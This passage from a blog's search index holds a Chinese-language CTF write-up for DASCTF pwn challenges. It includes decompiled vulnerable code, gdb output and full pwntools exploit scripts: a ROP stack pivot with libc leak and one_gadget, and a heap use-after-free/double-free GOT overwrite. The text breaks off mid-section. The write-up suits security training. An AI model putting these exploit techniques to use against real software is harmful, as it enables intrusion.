<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DASCTF-四月春季战-writeup(pwn)</title>
      <link href="/writing/DASCTF-%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E6%88%98-writeup-pwn/"/>
      <url>/writing/DASCTF-%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E6%88%98-writeup-pwn/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo_server"></a>echo_server</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><strong>checksec:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;pwn&#x2F;2004225e9ff11d445a3&#x2F;test&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>读取姓名时存在栈溢出漏洞。由于题目没有开启canary保护，所以可以利用rop来控制程序执行流。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"how long is your name: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"and what's you name? "</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read_name(&amp;s, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hello %s"</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul><li>利用<code>read</code>读取数据到<code>bss</code>段，<code>printf</code>泄露<code>libc</code>地址</li><li>将栈转移到<code>bss</code>段， 调用<code>one_gadget</code></li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p><strong>有用的gadget：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004006d0 : leave ; ret</span><br><span class="line">0x0000000000400823 : pop rdi ; ret</span><br><span class="line">0x0000000000400821 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure><p>开始做题的时候准备先将栈转移到<code>bss</code>段，再利用<code>printf</code>来泄露<code>libc</code>的地址，结果失败了，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">gef➤</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x00007ffcabba1f70  →  0x0000000000000000</span><br><span class="line">$rbx   : 0x00007f6f6b915760  →  0x00000000fbad2887</span><br><span class="line">$rcx   : 0x00007f6f6b639081  →  0x5777fffff0003d48 (&quot;H&#x3D;&quot;?)</span><br><span class="line">$rdx   : 0x00007ffcabba4530  →  0x0000003000000008</span><br><span class="line">$rsp   : 0x00007ffcabba1e40  →  0x0000000000000000</span><br><span class="line">$rbp   : 0x00007ffcabba4520  →  0x00000000006010e8  →  0x0000000000601120  →  0x0000000000601140  →  0x0000000000000000</span><br><span class="line">$rsi   : 0x0000000000400875  →  &quot;hello %s&quot;</span><br><span class="line">$rdi   : 0x00007ffcabba1e70  →  0x0000000000000000</span><br><span class="line">$rip   : 0x00007f6f6b58762d  →  &lt;buffered_vfprintf+93&gt; mov DWORD PTR [rsp+0x30], 0xfbad8004</span><br><span class="line">$r8    : 0x89</span><br><span class="line">$r9    : 0x83</span><br><span class="line">$r10   : 0xffffff7d</span><br><span class="line">$r11   : 0x246</span><br><span class="line">$r12   : 0xffffffff</span><br><span class="line">$r13   : 0x00007ffcabba4700  →  0x0000000000000001</span><br><span class="line">$r14   : 0x00007f6f6b915760  →  0x00000000fbad2887</span><br><span class="line">$r15   : 0xfbad2887</span><br><span class="line">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007ffcabba1e40│+0x0000: 0x0000000000000000   ← $rsp</span><br><span class="line">0x00007ffcabba1e48│+0x0008: 0x0000000000000000</span><br><span class="line">0x00007ffcabba1e50│+0x0010: 0x0000000000000000</span><br><span class="line">0x00007ffcabba1e58│+0x0018: 0x0000000000000000</span><br><span class="line">0x00007ffcabba1e60│+0x0020: 0x0000000000000000</span><br><span class="line">0x00007ffcabba1e68│+0x0028: 0x0000000000000000</span><br><span class="line">0x00007ffcabba1e70│+0x0030: 0x0000000000000000   ← $rdi</span><br><span class="line">0x00007ffcabba1e78│+0x0038: 0x0000000000000000</span><br><span class="line">────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7f6f6b587615 &lt;buffered_vfprintf+69&gt; lea    rdi, [rsp+0x30]</span><br><span class="line">   0x7f6f6b58761a &lt;buffered_vfprintf+74&gt; mov    QWORD PTR [rsp+0x110], rbx</span><br><span class="line">   0x7f6f6b587622 &lt;buffered_vfprintf+82&gt; mov    DWORD PTR [rsp+0xf0], 0xffffffff</span><br><span class="line"> → 0x7f6f6b58762d &lt;buffered_vfprintf+93&gt; mov    DWORD PTR [rsp+0x30], 0xfbad8004</span><br><span class="line">   0x7f6f6b587635 &lt;buffered_vfprintf+101&gt; mov    QWORD PTR [rsp+0x8], rax</span><br><span class="line">   0x7f6f6b58763a &lt;buffered_vfprintf+106&gt; lea    rax, [rsp+0x2130]</span><br><span class="line">   0x7f6f6b587642 &lt;buffered_vfprintf+114&gt; mov    QWORD PTR [rsp+0xb8], 0x0</span><br><span class="line">   0x7f6f6b58764e &lt;buffered_vfprintf+126&gt; movq   xmm0, QWORD PTR [rsp+0x8]</span><br><span class="line">   0x7f6f6b587654 &lt;buffered_vfprintf+132&gt; mov    QWORD PTR [rsp+0x60], rax</span><br><span class="line">──────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;test&quot;, stopped 0x7f6f6b58762d in buffered_vfprintf (), reason: SINGLE STEP</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x7f6f6b58762d → buffered_vfprintf(s&#x3D;0x7f6f6b915760 &lt;_IO_2_1_stdout_&gt;, format&#x3D;0x400875 &quot;hello %s&quot;, args&#x3D;0x7ffcabba4530)</span><br><span class="line">[#1] 0x7f6f6b584726 → _IO_vfprintf_internal(s&#x3D;0x7f6f6b915760 &lt;_IO_2_1_stdout_&gt;, format&#x3D;0x400875 &quot;hello %s&quot;, ap&#x3D;0x7ffcabba4530)</span><br><span class="line">[#2] 0x7f6f6b58df26 → __printf(format&#x3D;&lt;optimized out&gt;)</span><br><span class="line">[#3] 0x400766 → nop</span><br><span class="line">──────────────────────────────────────────────────────────────────</span><br><span class="line">2317    in vfprintf.c</span><br></pre></td></tr></table></figure><p>运行到<code>&lt;buffered_vfprintf+11&gt;</code>时，会将修改<code>rsp</code>导致<code>rsp+0x30</code>处不可写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  0x7f6f6b5875d6 &lt;buffered_vfprintf+6&gt; push   rbp</span><br><span class="line">  0x7f6f6b5875d7 &lt;buffered_vfprintf+7&gt; push   rbx</span><br><span class="line">  0x7f6f6b5875d8 &lt;buffered_vfprintf+8&gt; mov    rbx, rdi</span><br><span class="line">→ 0x7f6f6b5875db &lt;buffered_vfprintf+11&gt; sub    rsp, 0x2140</span><br><span class="line">  0x7f6f6b5875e2 &lt;buffered_vfprintf+18&gt; mov    rax, QWORD PTR fs:0x28</span><br><span class="line">  0x7f6f6b5875eb &lt;buffered_vfprintf+27&gt; mov    QWORD PTR [rsp+0x2138], rax</span><br><span class="line">  0x7f6f6b5875f3 &lt;buffered_vfprintf+35&gt; xor    eax, eax</span><br><span class="line">  0x7f6f6b5875f5 &lt;buffered_vfprintf+37&gt; mov    eax, DWORD PTR [rdi+0xc0]</span><br><span class="line">  0x7f6f6b5875fb &lt;buffered_vfprintf+43&gt; test   eax, eax</span><br></pre></td></tr></table></figure><p>只好直接调用<code>read@plt, printf@plt</code>了。<code>笨是笨了点，但是能用 ：）</code>大体步骤如下:</p><ul><li>首先修改<code>rbp</code>到<code>bss</code>段，修改<code>rdi, rsi</code>调用<code>read</code>读取第二段payload到<code>bss</code>段上</li><li>修改<code>rdi, rsi</code>，利用<code>printf</code>泄露出栈上残留的<code>libc</code>地址</li><li>再次调用<code>read</code>将<code>one_gadget</code>读取到<code>bss</code>段上</li><li>利用<code>leave; ret</code>转移栈到<code>bss</code>段上，调用<code>one_gadget</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>, <span class="string">"splitw"</span>, <span class="string">"-h"</span>]</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./test"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./test"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(arg=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> arg:</span><br><span class="line">        gdb.attach(p, arg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    raw_input(<span class="string">"&gt;&gt;&gt;&gt;&gt;&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">    printf_plt = elf.plt[<span class="string">"printf"</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># debug("b *0x400767")</span></span><br><span class="line">    p.recvuntil(<span class="string">"how long is your name: "</span>)</span><br><span class="line">    p.sendline(str(<span class="number">0x200</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"and what's you name? "</span>)  </span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">b"A"</span> * <span class="number">0x80</span></span><br><span class="line">    payload += p64(<span class="number">0x601080</span>) </span><br><span class="line">    <span class="comment"># read second payload to bss segment</span></span><br><span class="line">    payload += p64(<span class="number">0x400823</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x400821</span>) <span class="comment"># pop rdi ; ret </span></span><br><span class="line">    payload += p64(<span class="number">0x601070</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(read_plt) <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">    <span class="comment"># leak libc address</span></span><br><span class="line">    payload += p64(<span class="number">0x400823</span>) </span><br><span class="line">    payload += p64(<span class="number">0x601070</span>) + p64(<span class="number">0x400821</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    payload += p64(<span class="number">0x601060</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(printf_plt) <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">    <span class="comment"># read third payload to bss segement</span></span><br><span class="line">    payload += p64(<span class="number">0x400823</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x400821</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    payload += p64(<span class="number">0x601088</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(read_plt) <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">    payload += p64(<span class="number">0x4006d0</span>) <span class="comment"># leave ; ret</span></span><br><span class="line">    p.send(payload) </span><br><span class="line">    <span class="comment"># raw_input()</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b"&gt;&gt;%13$p\x00"</span> <span class="comment"># 0x601070</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x6010a0</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment"># raw_input()</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    libc_base = int(p.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x401733</span></span><br><span class="line">    success(<span class="string">"libc_base: &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x10a38c</span></span><br><span class="line"> </span><br><span class="line">    p.send(p64(one_gadget))</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h2 id="sales-office"><a href="#sales-office" class="headerlink" title="sales_office"></a>sales_office</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p>题目环境：<code>glibc-2.27</code></p><p><strong>checksec:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;pwn&#x2F;sales_office&#x2F;sales_office&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure><p>Buy:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  house *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You have no money."</span>);</span><br><span class="line">  v0 = num;</span><br><span class="line">  area[v0] = (house *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input the size of your house:"</span>);</span><br><span class="line">  v3 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">96</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't afford it."</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"?"</span>);</span><br><span class="line">  LODWORD(area[num]-&gt;house_size) = v3;</span><br><span class="line">  v2 = area[num];</span><br><span class="line">  v2-&gt;house_addr = (__int64)<span class="built_in">malloc</span>(v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please decorate your house:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)area[num]-&gt;house_addr, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  <span class="keyword">return</span> num++ + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Sell:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( area[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)area[v1]-&gt;house_addr);</span><br><span class="line">    <span class="built_in">free</span>(area[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现函数<code>sell()</code>中存在<code>UAF</code>漏洞。</p><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><ul><li>利用<code>UAF</code>泄露出libc地址</li><li>修改<code>puts@got</code>内容为<code>one_gadget</code></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>, <span class="string">"splitw"</span>, <span class="string">"-h"</span>]</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./sales_office"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./sales_office"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(arg=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> arg:</span><br><span class="line">        gdb.attach(p, arg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    raw_input(<span class="string">"&gt;&gt;&gt;&gt;&gt;&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(size, ctx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the size of your house:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"please decorate your house:"</span>)</span><br><span class="line">    p.send(ctx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    buy(<span class="number">0x10</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">    buy(<span class="number">0x10</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">    </span><br><span class="line">    sell(<span class="number">0</span>)</span><br><span class="line">    sell(<span class="number">0</span>)</span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">    buy(<span class="number">0x10</span>, p64(elf.got[<span class="string">"puts"</span>])+p64(<span class="number">0x10</span>))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">"house:\n"</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)) - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">    success(<span class="string">"libc_base: &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x10a38c</span></span><br><span class="line">    </span><br><span class="line">    sell(<span class="number">1</span>)</span><br><span class="line">    sell(<span class="number">1</span>)</span><br><span class="line">    buy(<span class="number">0x10</span>, p64(elf.got[<span class="string">"puts"</span>]))</span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">    buy(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h2 id="sales-office2"><a href="#sales-office2" class="headerlink" title="sales_office2"></a>sales_office2</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p>题目环境换成了<code>glibc-2.29</code></p><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>由于<code>glibc-2.29</code>的<code>tcache</code>引入了<code>key</code>， 所以不能直接<code>double free</code>了。</p><ul><li>购买多个<code>house</code>， 卖掉四个。造成<code>tcache</code>填满，使<code>chunk</code>落入<code>fastbin</code>中</li><li>由于有<code>chunk</code>在<code>fastbin</code>中， 再次购买时会产生错位，以至于可以利用<code>UAF</code>泄露<code>libc</code>地址</li><li>在<code>fastbin</code>中造成<code>double free</code>， 修改<code>atoi@got</code></li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 